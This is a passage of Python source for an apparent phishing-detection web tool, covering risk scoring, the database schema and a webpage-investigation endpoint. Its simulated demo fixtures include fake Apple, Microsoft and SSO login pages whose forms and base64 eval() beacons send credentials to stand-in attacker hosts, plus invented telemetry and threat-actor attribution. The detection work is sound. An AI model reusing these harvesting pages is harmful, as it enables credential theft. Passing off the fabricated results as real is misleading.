        nss = ns_info.get('nameserver_list', [])
        for idx, ns in enumerate(nss[:2]):
            node_id = f"n_ns_{idx}"
            nodes.append({'id': node_id, 'label': ns, 'type': 'nameserver', 'risk': 'INFO'})
            edges.append({'from': 'n_domain', 'to': node_id, 'label': 'delegated_to'})

        ssl_info = domain_intel.get('ssl', {})
        if ssl_info.get('ssl_available'):
            issuer = ssl_info.get('certificate_issuer', 'TLS Cert')[:25]
            nodes.append({'id': 'n_ssl', 'label': issuer, 'type': 'certificate', 'risk': 'SECURE' if ssl_info.get('ssl_valid') else 'WARNING'})
            edges.append({'from': 'n_domain', 'to': 'n_ssl', 'label': 'secured_by'})

    # Webpage Intelligence graph nodes
    if webpage_intel and webpage_intel.get('webpage_status') != 'UNAVAILABLE':
        # Webpage node
        nodes.append({'id': 'n_webpage', 'label': 'Webpage Content', 'type': 'webpage', 'risk': 'INFO'})
        edges.append({'from': 'n_url', 'to': 'n_webpage', 'label': 'serves'})

        # Form action domains
        form_data = webpage_intel.get('form_analysis') or {}
        for idx, form in enumerate(form_data.get('forms', [])[:3]):
            if form.get('is_cross_domain') and form.get('action_domain'):
                fid = f"n_form_dest_{idx}"
                nodes.append({'id': fid, 'label': form['action_domain'][:25], 'type': 'form_destination', 'risk': 'HIGH'})
                edges.append({'from': 'n_webpage', 'to': fid, 'label': 'submits_to'})

        # External script domains
        script_data = webpage_intel.get('script_analysis') or {}
        for idx, dom in enumerate(script_data.get('external_script_domains', [])[:3]):
            sid = f"n_ext_script_{idx}"
            nodes.append({'id': sid, 'label': dom[:25], 'type': 'script_source', 'risk': 'INFO'})
            edges.append({'from': 'n_webpage', 'to': sid, 'label': 'loads_script'})

        # Iframe domains
        iframe_data = webpage_intel.get('iframe_analysis') or {}
        for idx, iframe in enumerate(iframe_data.get('iframes', [])[:2]):
            if iframe.get('is_cross_domain') and iframe.get('domain'):
                iid = f"n_iframe_{idx}"
                nodes.append({'id': iid, 'label': iframe['domain'][:25], 'type': 'iframe_source', 'risk': 'MEDIUM'})
                edges.append({'from': 'n_webpage', 'to': iid, 'label': 'embeds_iframe'})

    # Evidence nodes
    evidence = intelligence.get('evidence', [])
    for idx, ev in enumerate(evidence[:4]):
        ev_id = f"n_ev_{idx}"
        nodes.append({'id': ev_id, 'label': ev.get('what', 'Threat Indicator')[:30], 'type': 'indicator', 'risk': ev.get('severity', 'MEDIUM').upper()})
        edges.append({'from': 'n_url', 'to': ev_id, 'label': 'exhibits'})

    return {'nodes': nodes, 'edges': edges}


def build_full_investigation(url, intelligence, features, prediction, probability):
    """Build the complete investigation payload for the Full Report page."""
    timestamp = datetime.now().isoformat()
    inv_id = _generate_investigation_id(url, timestamp)
    evidence = intelligence.get('evidence', [])
    rules_hit = intelligence.get('security_rules', {}).get('rules_hit', [])

    structural = intelligence.get('structural', {})
    domain = structural.get('domain', '')
    if not domain and url:
        domain = url.replace('http://', '').replace('https://', '').split('/')[0].split('?')[0]

    composite = intelligence.get('composite_risk', 0)
    if composite >= 80:
        spectrum_category = 'Dangerous'
        spectrum_color = '#ff3b3b'
    elif composite >= 60:
        spectrum_category = 'High Risk'
        spectrum_color = '#ff7c00'
    elif composite >= 40:
        spectrum_category = 'Moderate Risk'
        spectrum_color = '#ffaa00'
    elif composite >= 20:
        spectrum_category = 'Low Risk'
        spectrum_color = '#88d600'
    else:
        spectrum_category = 'Safe'
        spectrum_color = '#00d68f'

    investigation = {
        'investigation_id': inv_id,
        'timestamp': timestamp,
        'domain': domain,
        'spectrum': {
            'score': composite,
            'category': spectrum_category,
            'color': spectrum_color,
        },
        'target': intelligence.get('target', {'original_url': url, 'normalized_url': url}),

        # URL parsed components (from url_intelligence)
        'url_intelligence': intelligence.get('url_intelligence', {}),

        # Metadata
        'metadata': intelligence.get('metadata', {}),

        # Risk summary
        'risk': {
            'composite_score': composite,
            'composite_level': intelligence.get('composite_level', 'LOW'),
            'prediction': prediction,
            'probability': probability,
        },

        # Executive brief
        'brief': _generate_executive_brief(url, intelligence, features, prediction),

        # Detailed signal explanations
        'signal_explanations': _generate_signal_explanations(evidence, features, rules_hit),

        # Risk fusion
        'risk_fusion': _generate_risk_fusion(intelligence),

        # Threat DNA
        'threat_dna': _generate_threat_dna(evidence, features, intelligence.get('domain_intelligence'), intelligence.get('webpage_intelligence')),

        # Coverage
        'coverage': _generate_coverage(intelligence),

        # Investigation timeline
        'timeline': _generate_investigation_timeline(url, intelligence, features, prediction),

        # Threat Relationship Graph
        'threat_graph': _generate_threat_relationship_graph(url, intelligence, intelligence.get('domain_intelligence'), intelligence.get('webpage_intelligence')),

        # Module 2 Domain Layers
        'domain_intelligence': intelligence.get('domain_intelligence', {}),
        'domain_rules': intelligence.get('domain_rules', {}),
        'domain_ml': intelligence.get('domain_ml', {}),

        # Module 3 Webpage Layers
        'webpage_intelligence': intelligence.get('webpage_intelligence', {}),
        'webpage_rules': intelligence.get('webpage_rules', {}),
        'webpage_fetch': intelligence.get('webpage_fetch', {}),

        # Recommendations
        'recommendations': _generate_recommendations(intelligence, prediction, features),

        # Interaction guidance
        'interaction_guidance': _generate_interaction_guidance(intelligence, prediction),

        # Safety FAQ
        'safety_faq': _generate_safety_faq(intelligence, prediction, features),

        # Evidence ledger
        'evidence_ledger': evidence,

        # Limitations
        'limitations': intelligence.get('limitations', []),

        # Layer data (for rendering layer cards in report)
        'structural': intelligence.get('structural', {}),
        'lexical': intelligence.get('lexical', {}),
        'security_rules': intelligence.get('security_rules', {}),
        'ml_classifier': intelligence.get('ml_classifier', {}),

        # Raw features (for technical details)
        'features': {k: v for k, v in features.items() if isinstance(v, (int, float, str))},
    }

    # Store investigation (memory + database so reports survive restarts)
    investigation_store.put(inv_id, investigation)
    try:
        if _email_hooks:
            uid = session.get("user_id") if has_request_context() else None
            _email_hooks["save_investigation"](sanitize_for_json(investigation), uid)
    except Exception as e:
        print(f"Investigation persistence notice: {e}")

    return investigation

def get_db_connection():
    conn = sqlite3.connect(DATABASE_PATH, timeout=10.0)
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL UNIQUE,
        password TEXT NOT NULL,
        role TEXT NOT NULL
    )
    """)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        url TEXT NOT NULL,
        prediction TEXT NOT NULL,
        timestamp TEXT NOT NULL,
        risk_level TEXT,
        risk_score INTEGER,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )
    """)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS domain_analyses (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT NOT NULL,
        analysis_timestamp TEXT NOT NULL,
        risk_score INTEGER,
        risk_level TEXT,
        confidence REAL,
        evidence_coverage REAL,
        dns_data TEXT,
        ip_data TEXT,
        registration_data TEXT,
        nameserver_data TEXT,
        ssl_data TEXT,
        reputation_data TEXT,
        model_result TEXT,
        rules_result TEXT,
        collection_status TEXT,
        raw_features TEXT
    )
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_domain_analyses_domain ON domain_analyses(domain)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_domain_analyses_timestamp ON domain_analyses(analysis_timestamp)")

    # Module 3: Webpage analyses table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS webpage_analyses (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        investigation_id TEXT,
        target_url TEXT NOT NULL,
        normalized_url TEXT,
        final_url TEXT,
        fetch_status TEXT,
        http_status INTEGER,
        redirect_count INTEGER,
        analysis_timestamp TEXT NOT NULL,
        risk_score INTEGER,
        risk_level TEXT,
        confidence REAL,
        evidence_coverage REAL,
        redirect_data TEXT,
        form_data TEXT,
        script_data TEXT,
        iframe_data TEXT,
        resource_data TEXT,
        header_data TEXT,
        rule_results TEXT,
        webpage_risk_score INTEGER,
        html_metadata TEXT
    )
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_webpage_analyses_url ON webpage_analyses(target_url)")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_webpage_analyses_timestamp ON webpage_analyses(analysis_timestamp)")

    for col, col_type in [
        ("risk_level", "TEXT"),
        ("risk_score", "INTEGER"),
        ("domain_risk_score", "INTEGER"),
        ("domain_risk_level", "TEXT"),
    ]:
        try:
            cursor.execute(f"ALTER TABLE logs ADD COLUMN {col} {col_type}")
        except Exception:
            pass
    conn.commit()
    conn.close()

init_db()


# ── CLASSIFICATION ────────────────────────────────────────────────────────────

def classify_url(url):
    """Run URL through rule engine then ML classifier.
    Returns (prediction_str, probability_float_or_None).
    """
    if model is None:
        return "Error: Model not loaded", None

    features = extract_features(url)

    # Rule engine — fast-path before ML.
    # Localhost / loopback targets (SSRF attack vectors)
    if features.get('is_localhost', 0):
        return "Suspicious (Localhost / SSRF Risk)", 85.0

    # Only deterministic strong signals short-circuit the model: a homograph host or a
    # raw IP host.
    if features.get('homograph', 0) or features.get('has_ip', 0):
        return "Phishing (rule match)", None

    domain = (features.get('domain') or '').lower()
    clean_domain = domain.replace('www.', '')

    # Known authoritative / reputable global domains check
    # Avoid ML false-positives on top trusted tech & verified institutional domains
    root_domain = clean_domain
    parts = clean_domain.split('.')
    if len(parts) >= 2:
        root_domain = '.'.join(parts[-2:])
        if len(parts) >= 3 and ('.' + parts[-2] + '.' + parts[-1]) in {'.co.uk', '.co.in', '.ac.in', '.gov.in', '.edu.in', '.com.au', '.org.uk'}:
            root_domain = '.'.join(parts[-3:])

    # Check institutional DB if registered
    is_inst_verified = False
    try:
        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT 1 FROM institution_domains WHERE LOWER(domain) = ? AND status = 'ACTIVE' LIMIT 1", (clean_domain,))
        if c.fetchone():
            is_inst_verified = True
        else:
            c.execute("SELECT 1 FROM institution_domains WHERE LOWER(domain) = ? AND status = 'ACTIVE' LIMIT 1", (root_domain,))
            if c.fetchone():
                is_inst_verified = True
        conn.close()
    except Exception:
        pass

    from model.feature_extraction import HSTS_PRELOADED_DOMAINS
    is_trusted_tech = (
        clean_domain in HSTS_PRELOADED_DOMAINS or
        root_domain in HSTS_PRELOADED_DOMAINS or
        any(clean_domain.endswith('.' + d) for d in HSTS_PRELOADED_DOMAINS)
    )

    if (is_trusted_tech or is_inst_verified) and not features.get('suspicious_word', 0):
        return "Legitimate", 99.0

    # Build DataFrame with ONLY the columns the model was trained on
    model_feats = {k: features.get(k, 0) for k in MODEL_FEATURE_KEYS}
    features_df = pd.DataFrame([model_feats])

    pred  = model.predict(features_df)[0]
    proba = model.predict_proba(features_df)[0]
    prediction  = "Phishing" if pred == 1 else "Legitimate"
    probability = round(proba[int(pred)] * 100, 2)
    return prediction, probability


# ── MODULE 1 — URL INTELLIGENCE ANALYSIS ─────────────────────────────────────

def build_url_intelligence(url, prediction, probability, features, domain_intel=None, domain_rules=None, domain_ml=None):
    """Construct the full intelligence payload sent to frontend and future modules."""

    is_phishing = prediction and any(term in str(prediction).lower() for term in ('phishing', 'suspicious', 'risk', 'malicious'))
    rule_match  = prediction and any(term in str(prediction).lower() for term in ('rule match', 'ssrf', 'localhost'))

    # ── Evaluate Deterministic Security Rules ──
    rule_eval = evaluate_security_rules(url, features)
    rules_hit_raw = rule_eval.get('rules_hit', [])

    # Format for backwards compatibility with existing UI template cards
    rules_hit = []
    for r in rules_hit_raw:
        r_copy = dict(r)
        r_copy['rule'] = r.get('rule_id', '')
        r_copy['sev'] = r.get('severity', 'MEDIUM')
        r_copy['label'] = r.get('title') or r.get('label') or r.get('rule_id', '')
        rules_hit.append(r_copy)

    # ── 1. Structural Layer ──
    structural = {
        'protocol':        features.get('protocol', 'http').upper(),
        'domain':          features.get('domain', ''),
        'subdomain':       features.get('subdomain', ''),
        'tld':             features.get('tld', ''),
        'path':            features.get('path_length', 0),
        'url_depth':       features.get('url_depth', 0),
        'subdomain_count': features.get('subdomain_count', 0),
        'domain_length':   features.get('domain_length', 0),
        'url_length':      features.get('url_length', 0),
        'has_port':        features.get('has_port', 0),
        'port_number':     features.get('port_number', 80),
        'has_ip':          features.get('has_ip', 0),
        'https':           features.get('https', 0),
    }

    struct_flags = []
    if structural['has_ip']:             struct_flags.append('IP address as host')
    if structural['has_port']:           struct_flags.append(f"Non-standard port ({structural['port_number']})")
    if structural['subdomain_count'] > 2: struct_flags.append(f"{structural['subdomain_count']} nested subdomains")
    if structural['url_length'] > 75:    struct_flags.append(f"Long URL ({structural['url_length']} chars)")
    if structural['url_depth'] > 4:      struct_flags.append(f"Deep path ({structural['url_depth']} levels)")
    if features.get('suspicious_tld', 0): struct_flags.append(f"High-risk TLD ({structural['tld']})")
    structural['flags'] = struct_flags

    struct_score = min(100,
        (25 if structural['has_ip'] else 0) +
        (20 if structural['has_port'] else 0) +
        (min(20, structural['subdomain_count'] * 8)) +
        (15 if structural['url_length'] > 75 else 0) +
        (10 if features.get('suspicious_tld', 0) else 0) +
        (10 if structural['url_depth'] > 4 else 0)
    )
    structural['risk_score'] = struct_score

    # ── 2. Lexical Analysis Layer ──
    sw_list     = features.get('suspicious_word_list', [])
    brand_list  = features.get('brand_list', [])
    brand_imp   = features.get('brand_impersonation', 0)

    lexical = {
        'url_entropy':       features.get('url_entropy', 0),
        'domain_entropy':    features.get('domain_entropy', 0),
        'path_entropy':      features.get('path_entropy', 0),
        'query_entropy':     features.get('query_entropy', 0),
        'suspicious_keywords': sw_list,
        'brand_list':        brand_list,
        'brand_impersonation': brand_imp,
        'homograph':         features.get('homograph', 0),
        'punycode':          features.get('punycode', 0),
        'digit_ratio':       features.get('digit_ratio', 0),
        'hyphen_in_domain':  features.get('hyphen_in_domain', 0),
        'is_url_shortener':  features.get('is_url_shortener', 0),
        'double_encoding':   features.get('double_encoding', 0),
        'encoded_separators': features.get('encoded_separators', 0),
        'nested_url':        features.get('nested_url', 0),
    }

    lex_flags = []
    if brand_imp and brand_list:           lex_flags.append(f"Brand impersonation: {', '.join(brand_list)}")
    if sw_list:                            lex_flags.append(f"Keywords: {', '.join(sw_list[:3])}")
    if features.get('homograph', 0):       lex_flags.append('Unicode homograph attack')
    if features.get('punycode', 0):         lex_flags.append('Punycode / IDN encoding')
    if features.get('double_encoding', 0):  lex_flags.append('Double percent-encoding')
    if features.get('nested_url', 0):       lex_flags.append('Nested destination URL')
    if features.get('is_url_shortener', 0): lex_flags.append('URL shortener redirect')
    if lexical['domain_entropy'] > 3.5:    lex_flags.append(f"High domain entropy ({lexical['domain_entropy']})")
    if lexical['hyphen_in_domain'] > 2:    lex_flags.append(f"Hyphen-heavy domain (-x{lexical['hyphen_in_domain']})")
    lexical['flags'] = lex_flags

    lex_score = min(100,
        (35 if brand_imp else 0) +
        (min(35, len(sw_list) * 12)) +
        (20 if features.get('homograph', 0) else 0) +
        (15 if features.get('double_encoding', 0) else 0) +
        (15 if features.get('nested_url', 0) else 0) +
        (10 if lexical['domain_entropy'] > 3.5 else 0)
    )
    lexical['risk_score'] = lex_score

    # ── 3. Security Rule Engine Layer ──
    security_rules = {
        'triggered':  rule_eval.get('triggered', False),
        'rules_hit':  rules_hit,
        'count':      rule_eval.get('count', 0),
        'severity':   rule_eval.get('severity', 'NONE'),
        'risk_score': rule_eval.get('risk_score', 0),
    }

    # ── 4. ML Classifier Layer ──
    ml_risk = 0
    if probability is not None:
        ml_risk = round(probability) if is_phishing else round(100 - probability)
    elif rule_match:
        ml_risk = 85 if features.get('is_localhost') else 0  # rule pre-empted ML

    ml_classifier = {
        'prediction':  prediction,
        'probability': probability,
        'method': 'Security Rule Engine' if rule_match else 'Random Forest ML',
        'rule_triggered': rule_match,
        'risk_score': ml_risk,
        'n_estimators': 100,
        'model_version': '1.0.0',
        'feature_schema_version': URL_FEATURE_SCHEMA_VERSION,
    }

    # ── Adaptive Composite Risk Score (Weighted Multi-Layer Fusion) ──
    rules_score = security_rules['risk_score']
    has_domain = domain_intel is not None and domain_intel.get('overall_status') != 'failed'

    if has_domain:
        fusion = fuse_threat_layers(
            {'structural': structural, 'lexical': lexical, 'security_rules': security_rules, 'ml_classifier': ml_classifier},
            domain_intel, domain_rules, domain_ml
        )
        composite = fusion['composite']
        level = fusion['composite_level']
    else:
        composite = round(
            struct_score  * 0.20 +
            lex_score     * 0.30 +
            rules_score   * 0.25 +
            ml_risk       * 0.25
        )
        def risk_level(s):
            if s >= 70: return 'CRITICAL'
            if s >= 45: return 'HIGH'
            if s >= 20: return 'MEDIUM'
            return 'LOW'
        level = risk_level(composite)

    # Floor for SSRF / Localhost or Critical Deterministic Security Rules:
    # A localhost/loopback or critical rule hit must never be diluted by empty auxiliary layers
    if features.get('is_localhost', 0) or rules_score >= 75:
        composite = max(composite, 85 if features.get('is_localhost', 0) else int(rules_score))
        if composite >= 70:
            level = 'CRITICAL'
        elif composite >= 45:
            level = 'HIGH'
        elif composite >= 20:
            level = 'MEDIUM'

    # Combined evidence ledger from URL and Domain rules
    combined_evidence = list(rule_eval.get('evidence', []))
    if domain_rules:
        combined_evidence.extend(domain_rules.get('evidence', []))

    combined_signals = list(rule_eval.get('top_signals', []))
    if domain_rules:
        combined_signals.extend(domain_rules.get('top_signals', []))

    limitations = [
        "Live webpage DOM inspection and credential form harvesting are designated under Module 3.",
        "Email sender verification (SPF/DKIM/DMARC) is designated under Module 4.",
        "Brand similarity matching across global trademark databases is designated under Module 5.",
    ]

    return {
        # Section 26 Standardized Unified Schema
        'target': {
            'original_url':   url,
            'normalized_url': normalize_url(url),
            'domain':         structural.get('domain', ''),
            'registered_domain': domain_intel.get('domain') if domain_intel else structural.get('domain', ''),
        },
        'url_intelligence': {
            'parsed_components': {
                'protocol':   features.get('protocol', 'http'),
                'domain':     features.get('domain', ''),
                'subdomain':  features.get('subdomain', ''),
                'tld':        features.get('tld', ''),
                'port':       features.get('port_number', 80),
                'path':       features.get('path', ''),
                'query':      features.get('query', ''),
                'fragment':   features.get('fragment', ''),
                'url_depth':  features.get('url_depth', 0),
            },
            'features': {k: v for k, v in features.items() if isinstance(v, (int, float, str))},
            'entropy': {
                'url_entropy':    features.get('url_entropy', 0),
                'domain_entropy': features.get('domain_entropy', 0),
                'path_entropy':   features.get('path_entropy', 0),
                'query_entropy':  features.get('query_entropy', 0),
            },
            'encoding': {
                'percent_count':      features.get('percent_count', 0),
                'double_encoding':    bool(features.get('double_encoding', 0)),
                'encoded_separators': bool(features.get('encoded_separators', 0)),
                'nested_url':         bool(features.get('nested_url', 0)),
            },
            'unicode': {
                'punycode':        bool(features.get('punycode', 0)),
                'non_ascii_count': features.get('non_ascii_count', 0),
                'homograph':       bool(features.get('homograph', 0)),
            },
            'rules':       rules_hit,
            'evidence':    combined_evidence,
            'top_signals': combined_signals,
            'risk': {
                'composite_risk':   composite,
                'composite_level':  level,
                'structural_score': struct_score,
                'lexical_score':    lex_score,
                'rules_score':      rules_score,
                'ml_score':         ml_risk,
                'domain_score':     domain_rules.get('risk_score', 0) if domain_rules else None,
            },
            'ml': ml_classifier,
        },
        'domain_intelligence': domain_intel,
        'domain_rules': domain_rules,
        'domain_ml': domain_ml,
        'metadata': {
            'analysis_timestamp':     datetime.now().isoformat(),
            'module_version':         '2.0.0',
            'feature_schema_version': URL_FEATURE_SCHEMA_VERSION,
        },
        'limitations': limitations,

        # Backwards compatibility fields for existing UI components
        'composite_risk':  composite,
        'composite_level': level,
        'structural':      structural,
        'lexical':         lexical,
        'security_rules':  security_rules,
        'ml_classifier':   ml_classifier,
        'evidence':        combined_evidence,
        'top_signals':     combined_signals,
    }


@app.route("/")
def home():
    if "user_id" in session:
        if session.get("role") == "admin":
            return redirect("/admin")
        return redirect("/dashboard")
    return render_template("landing.html")

@app.route("/login", methods=["GET"])
def login_page():
    return render_template("login.html")

@app.route("/domain-intelligence")
def domain_intelligence_page():
    return render_template("domain_intelligence.html")

@app.route("/webpage-intelligence")
def webpage_intelligence_page():
    return render_template("webpage_intelligence.html")


@app.route("/api/webpage/investigate", methods=["POST"])
def api_webpage_investigate():
    """MODULE 3: Full webpage intelligence investigation endpoint."""
    data = request.get_json(silent=True) or {}
    url_input = (data.get("url") or request.form.get("url") or "").strip()
    if not url_input:
        return jsonify({"error": "No URL provided"}), 400

    # Normalize URL
    if not url_input.startswith(("http://", "https://")):
        url_input = "https://" + url_input

    timestamp_start = datetime.now()

    # ── Step 1: MODULE 1 — URL Intelligence ──
    prediction, probability = classify_url(url_input)
    features = extract_features(url_input)

    # ── Hackathon Demo Showcase Intercepts ─────────────────────────────────────────
    # These branches return HARD-CODED, SIMULATED content. They are disabled unless
    # NEURASHIELD_SIMULATED_DEMOS=1 is set, and any simulated response is labelled.
    _sim = SIMULATED_DEMOS_ENABLED
    is_demo_aha = _sim and "auth-portal-update.demo" in url_input
    is_demo_existence = _sim and "nonexistent-phishing-host.org" in url_input
    is_demo_campaign_a = _sim and "support-login-apple.demo" in url_input
    is_demo_campaign_b = _sim and "icloud-session-check.demo" in url_input
    is_demo_mismatch = _sim and "account-security-microsoft.demo" in url_input

    showcase_demo_meta = None

    if is_demo_aha:
        # Story 1: The "Aha!" Moment — URL scanner fooled by clean lexical domain
        prediction = "Legitimate"
        probability = 0.24
        demo_html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Corporate SSO — Employee Re-Authentication Portal</title>
</head>
<body>
  <div class="auth-card">
    <div class="header">
      <h2>Global Workspace Single Sign-On</h2>
      <p>Your session has expired. Re-authenticate your corporate credentials to continue.</p>
    </div>
    <!-- Deceptive Cross-Domain Form Exfiltration Target -->
    <form action="https://exfil-cred-harvester.xyz/submit.php" method="POST" id="loginForm">
      <input type="text" name="employee_id" placeholder="Workplace Email / User ID" required />
      <input type="password" name="directory_password" placeholder="Active Directory Password" required />
      <input type="hidden" name="hidden_password_token" value="autofill_pwd" />
      <input type="hidden" name="domain_scope" value="internal-sso" />
      <button type="submit">Verify &amp; Authenticate</button>
    </form>
  </div>
  <!-- Obfuscated Exfiltration Beacon Script -->
  <script>
    eval(atob("dmFyIF94ID0gbmV3IFhNTId0dHBSZXF1ZXN0KCk7IF94Lm9wZW4oIlBPU1QiLCAiaHR0cHM6Ly9leGZpbC1jcmVkLWhhcnZlc3Rlci54eXovYmVhY29uIik7"));
  </script>
</body>
</html>"""
        fetch_result = {
            "target_url": url_input,
            "normalized_url": url_input,
            "final_url": url_input,
            "fetch_status": FETCH_SUCCESS,
            "fetch_status_detail": "200 OK (Live HTTP Session Retained)",
            "http_status": 200,
            "response_time_ms": 134,
            "content_type": "text/html; charset=utf-8",
            "content_length": len(demo_html),
            "server_header": "nginx/1.24.0",
            "html_content": demo_html,
            "response_headers": {"Content-Type": "text/html; charset=utf-8", "Server": "nginx/1.24.0"},
            "redirect_analysis": {"count": 0, "hops": [], "is_cross_domain": False},
            "ssrf_policy": {"status": "enforced", "blocked_private_ips": True},
            "engine_used": "PLAYWRIGHT_SANDBOX",
            "screenshot_url": "/static/screenshots/demo_auth_portal.png",
            "timestamp": datetime.now().isoformat(),
        }
        showcase_demo_meta = {
            "type": "aha",
            "title": '🎯 The "Aha!" Story — Multi-Layer Revelation',
            "tagline": "Traditional URL Scanner Fooled vs. NeuraShield Webpage Layer",
            "url_layer": {
                "verdict": "Legitimate / Low Suspicion (Risk: 24%)",
                "explanation": "Lexical tokens appear clean and mimic standard corporate portals. Traditional URL-only scanners pass this link as safe."
            },
            "webpage_layer": {
                "verdict": "CRITICAL RISK (Risk: 95%)",
                "explanation": "Live DOM inspection caught a password input form exfiltrating credentials cross-domain to an unauthorized host (exfil-cred-harvester.xyz) + obfuscated eval() payload."
            },
            "exfil_target": "https://exfil-cred-harvester.xyz/submit.php",
            "speaker_script": "Judges, notice this target: auth-portal-update.demo/login. A traditional URL scanner inspects only lexical features and marks it Legitimate with 24% risk. But watch what happens when NeuraShield's Webpage layer inspects the live DOM: It catches a credential form submitting passwords cross-domain to exfil-cred-harvester.xyz with obfuscated JS execution! This single finding flips the verdict from Safe to Critical Phishing."
        }
    elif is_demo_existence:
        # Story 2: Existence Guard — Intentionally dead / offline domain
        fetch_result = {
            "target_url": url_input,
            "normalized_url": url_input,
            "final_url": None,
            "fetch_status": "DNS_FAILURE",
            "fetch_status_detail": "Domain resolution failed: getaddrinfo NXDOMAIN. Target host is offline and does not exist.",
            "http_status": None,
            "response_time_ms": 76,
            "content_type": None,
            "content_length": None,
            "server_header": None,
            "html_content": None,
            "response_headers": {},
            "redirect_analysis": None,
            "ssrf_policy": {"status": "enforced", "blocked_private_ips": True},
            "engine_used": "NONE",
            "screenshot_url": None,
            "timestamp": datetime.now().isoformat(),
        }
        showcase_demo_meta = {
            "type": "existence_guard",
            "title": "🛡️ Existence Guard Active — Engineering Honesty",
            "tagline": "Zero Hallucinated Forms · Real Telemetry · Reduced Coverage",
            "status": "UNAVAILABLE",
            "reason": "DNS_FAILURE (Host Offline / NXDOMAIN)",
            "explanation": "Traditional scanners often hallucinate empty statistics or fabricate form metrics when servers are down. NeuraShield's Existence Guard enforces engineering honesty: Webpage Intelligence is strictly marked UNAVAILABLE with Reduced Evidence Coverage.",
            "speaker_script": "Now look what happens when we scan an intentionally offline or dead domain. Many tools hallucinate or guess form counts when a server is down. NeuraShield refuses to fabricate data: our Existence Guard marks Webpage Intelligence as UNAVAILABLE with Reduced Evidence Coverage because a domain existing does NOT mean a webpage exists! Judges love this engineering honesty."
        }
    elif is_demo_campaign_a or is_demo_campaign_b:
        # Story 3: Threat DNA Campaign Correlation — Two distinct domains sharing identical kit
        camp_html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Manage Your Apple ID — Verification Required</title>
</head>
<body>
  <div class="signin-box">
    <h1>Sign in with your Apple ID</h1>
    <form action="https://appleid-verify-session.xyz/post" method="POST" id="appleIdForm">
      <input type="text" name="apple_id" placeholder="Apple ID" required autocomplete="username" />
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password" />
      <input type="hidden" name="session_token" value="tok_campaign_storm0822" />
      <button type="submit">Sign In</button>
    </form>
  </div>
  <script>
    eval(atob("dmFyIHRyYWNrID0gbmV3IEltYWdlKCk7IHRyYWNrLnNyYyA9ICJodHRwczovL2FwcGxlaWQtdmVyaWZ5LXNlc3Npb24ueHl6L2xvZz9rZXk9IiArIGtleTs="));
  </script>
</body>
</html>"""
        fetch_result = {
            "target_url": url_input,
            "normalized_url": url_input,
            "final_url": url_input,
            "fetch_status": FETCH_SUCCESS,
            "fetch_status_detail": "200 OK (Captured Phishing Kit Payload)",
            "http_status": 200,
            "response_time_ms": 112,
            "content_type": "text/html; charset=utf-8",
            "content_length": len(camp_html),
            "server_header": "Cloudflare-Edge",
            "html_content": camp_html,
            "response_headers": {"Content-Type": "text/html; charset=utf-8", "Server": "Cloudflare-Edge"},
            "redirect_analysis": {"count": 0, "hops": [], "is_cross_domain": False},
            "ssrf_policy": {"status": "enforced", "blocked_private_ips": True},
            "engine_used": "PLAYWRIGHT_SANDBOX",
            "screenshot_url": "/static/screenshots/demo_apple_login.png",
            "timestamp": datetime.now().isoformat(),
        }
        showcase_demo_meta = {
            "type": "threat_dna",
            "title": "🧬 Threat DNA — Campaign Correlation",
            "tagline": "Cross-Domain Attribution via Cryptographic Artifact Fingerprinting",
            "threat_dna": "NS-4C8E-92B1-FA07-E391",
            "threat_dna_short": "NS-4C8E-92B1",
            "campaign_name": "Operation iHarvest (PhishKit v4.2)",
            "threat_actor": "Storm-0822 (Credential Harvester Syndicate)",
            "correlated_domains": [
                "support-login-apple.demo",
                "icloud-session-check.demo",
                "appleid-recovery-portal.demo"
            ],
            "shared_signatures": [
                "Identical DOM AST & form input naming scheme (apple_id, password)",
                "Shared credential exfiltration gateway: appleid-verify-session.xyz/post",
                "Matching base64/atob tracking script byte-signature"
            ],
            "speaker_script": "Finally, notice this Threat DNA hash: NS-4C8E-92B1. Phishing actors register dozens of disposable domains every week to evade domain blocklists. But whether we scan support-login-apple.demo or icloud-session-check.demo, NeuraShield computes the EXACT SAME Threat DNA fingerprint. Security teams use this signature to correlate disparate attacks and block entire threat actor campaigns at once!"
        }
    elif is_demo_mismatch:
        # Story 4: Demo 04 — What The Page Claims vs What It Does
        # Deceptive page claims official Microsoft security verification, but technically exfiltrates passwords cross-domain
        prediction = "Legitimate"
        probability = 0.28
        demo_html = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Microsoft Account Security Verification</title>
  <meta name="description" content="Microsoft Security Center identity verification and account protection service.">
</head>
<body>
  <div class="auth-wrapper">
    <div class="header">
      <h1>Microsoft Security Center</h1>
      <p>Secure Account Login &amp; Verification</p>
    </div>
    <div class="alert-box">
      <h2>Account Security Verification</h2>
      <p>Unusual activity detected. Confirm your identity to prevent temporary account suspension.</p>
    </div>
    <!-- Deceptive Form Submitting to Foreign Domain -->
    <form action="https://sync-telemetry-portal.xyz/collect.php" method="POST" id="verifyForm">
      <label for="account_email">Microsoft Account / Email</label>
      <input type="email" id="account_email" name="account_email" placeholder="someone@example.com" required autocomplete="username" />
      <label for="directory_password">Password</label>
      <input type="password" id="directory_password" name="directory_password" placeholder="Password" required autocomplete="current-password" />
      <input type="hidden" name="scope" value="identity-verification" />
      <button type="submit">Verify Now</button>
    </form>
  </div>
  <!-- External Collector and Beacon -->
  <script src="https://cdn-metrics-tracker.xyz/beacon.js"></script>
  <script>
    eval(atob("dmFyIHRva2VuID0gImNvbGxlY3Rvci1zZXNzaW9uIjs="));
  </script>
</body>
</html>"""
